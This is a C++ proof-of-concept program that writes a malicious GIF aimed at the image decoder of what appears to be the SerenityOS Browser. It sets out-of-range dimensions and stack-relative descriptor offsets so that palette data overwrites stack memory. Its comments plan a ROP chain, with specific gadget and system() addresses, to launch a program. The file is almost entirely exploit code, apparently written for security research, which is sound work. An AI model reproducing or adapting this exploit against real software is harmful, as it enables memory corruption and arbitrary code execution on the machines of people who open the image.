#include <AK/Assertions.h>
#include <AK/LogStream.h>
#include <AK/Types.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

struct [[gnu::packed]] GIFHeader {
  u16 width, height;

  // (gcm_info & 0x80) >> 7: has global color palette?
  // ((gcm_info & 0x70) >> 4) + 1: bits of color resolution per palette entry
  // (gcm_info & 0x08) >> 3): is global palette sorted in decreasing order of entry importance
  // (gcm_info & 0x07) + 1: bits per pixel, determines number of palette entries
  u8 gcm_info;

  void set_has_global_palette(bool b)
  {
      if (b)
          gcm_info |= 0x80;
      else
          gcm_info &= ~0x80;
  }

  void set_bits_per_pixel(int n)
  {
      ASSERT(n <= 8);
      gcm_info |= (n - 1) & 7;
  }

  int bits_per_pixel() const { return (gcm_info & 7) + 1; }

  u8 bg_color_index;
  u8 pixel_aspect_ratio;
};

struct [[gnu::packed]] GIFImageDescriptor {
  u16 x, y;
  u16 width, height;

  //  <Packed Fields>  =      Local Color Table Flag        1 Bit
  //                          Interlace Flag                1 Bit
  //                          Sort Flag                     1 Bit
  //                          Reserved                      2 Bits
  //                          Size of Local Color Table     3 Bits
  u8 packed_fields;
};

int main()
{
    u8 buffer[4096];
    memset(buffer, 0, sizeof(buffer));

    memcpy(buffer, "GIF89a", 6);
    auto& header = *(GIFHeader*)(buffer + 6);
    header.width = USHRT_MAX;
    header.height = 1;
    header.set_has_global_palette(true);
    header.set_bits_per_pixel(7);

    // Can write to:
    // - *any* 4-aligned address relative to bitmap start
    // - 4-byte values that are either 0xFFabcdef or 0x00abcdef
    //   with abcdef arbitrary

    // We can write entries from the palette (== 4 bytes at a time)
    // at any (writable) address we want, e.g. to the stack.
    // However, the alpha channel will be 0xff for all colors except
    // for one transparent color -- but we can have one transparent
    // color per layer, where alpha is 0x00 instead.
    // Since .text is mappped at 0x08048000 this means we can't set
    // eip to a valid address :/

    // This allows a return to libc attack (...wrong, see above). Address of 'system` is
    // known and fixed (...I think?). But we need a pointer to a
    // string we control. We can put arbitrary data e.g. in the bitmap
    // so we can put the string there, but then we don't know its address.
    // Hm, elf data seg should have a fixed address, so could store
    // string there and pass that address. Ah, but we don't know the
    // base address of the bitmap, and we can only do bitmap-addr-relative
    // writes :/
    // Writing to stack only works because relative offset between bitmap
    // mmap and stack happens to be fixed for some reason, but the addresses
    // themselves are different on each execution.

    // Plan: Put data seg (0x081ed600) on stack, use gadget at 0x080bb529 to
    // get it into // edx, put "/bin" on stack, use gadget at 0x080929fa to get
    // it into // eax, use gadget at 0x08199d1b for "mov dword ptr [edx], eax ; ret"
    // repeat basic procedure a few times to also copy "/Cal", "cula", "tor\0"
    // Then put data seg on stack again and call system at 08199f4e

    // Inspired by `~/.local/bin/ROPgadget --ropchain --binary Applications/Browser/Browser` 

    size_t offset = 6 + sizeof(GIFHeader);
    int color_map_entry_count = 1 << header.bits_per_pixel();
    for (int i = 0; i < color_map_entry_count; ++i) {
        // Dummy global palette.
        buffer[offset++] = (i + 0);
        buffer[offset++] = 2 * i;
        buffer[offset++] = 3 * i;

        //dbg() << "wrote offset " << offset << ", i"  << i << ", entries " << color_map_entry_count;
    }
    // system: 0x0819a1ee

    // Start an image.
    buffer[offset++] = ',';
    auto& descriptor = *(GIFImageDescriptor*)(buffer + offset);
    offset += sizeof(GIFImageDescriptor);


    // At 396281b, the offset from the stack to the bitmap address is always 0x57a000
    // At acfae910 too. Let's assume that's always the case.
    // Always meaning after `br a.gif`, if loading the homepage first it's different.
    // FIXME: Try making the gif higher, maybe if it needs more pages it's more reliable
    // where it ends up relative to stack.
    unsigned offset_stack_to_bitmap = 0x57a000;

    // THe offset from the bitmap to the stack (with wrap-around) is 0xffa86000
    // 0x57a000 == 0x57 * 0xffff + 0xa057
    // 0xffa86000 = 0x3fea * 0x40000 + 0x1800 * 4
    unsigned offset_bitmap_to_stack = -offset_stack_to_bitmap;

    // Note: Pitch is 4*width rounded up to next power of two (why??), i.e. 0x40000
    // y and x in bitmap are signed int, but are u16 in gif.
    unsigned pitch = header.width * 4;
    pitch = 1 << (32 - __builtin_clz(pitch - 1));  // Round to next power of two.

    //
    // But the actual stack is stored at the top of that region. The stack region
    // is 4mb (0x400000), so need to add that and then go back by ca 5k bytes
    // to reach the top of stack (eip is 0x14f4 bytes from top of stack)
    // In the `br a.gif` case:
    /// >>> 0x1c03000 + 0x400000 - 0x02001b14
    /// 5356
    offset_bitmap_to_stack += 0x400000 - 0xac8;

    // XXX the offset is for `br a.gif`; adjust it for loading the home page
    // first, or for loading the gif off the web or something
    descriptor.y = offset_bitmap_to_stack / pitch; //USHRT_MAX;
    descriptor.x = (offset_bitmap_to_stack - pitch*descriptor.y) / 4; //USHRT_MAX;
    descriptor.width = 1;
    descriptor.height = 1;

    // LZW image data
    int lzw_minimum_code_size = header.bits_per_pixel();
    int clear_code = 1 << header.bits_per_pixel();
    int end_code = clear_code + 1;
    buffer[offset++] = lzw_minimum_code_size;

    buffer[offset++] = 3;  // Number of bytes in stream
    // 7 bpp + clear / end code means the first 125 codes are
    // all exactly one byte :)
    buffer[offset++] = clear_code;
    buffer[offset++] = 0;
    buffer[offset++] = end_code;

    buffer[offset++] = 0;

    // Done with file.
    buffer[offset++] = ';';

    int fd = open("a.gif", O_WRONLY | O_CREAT, 0755);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    int rc = write(fd, buffer, sizeof(buffer));
    if (rc < (int)sizeof(buffer)) {
        perror("write");
        return 1;
    }
    close(fd);
}
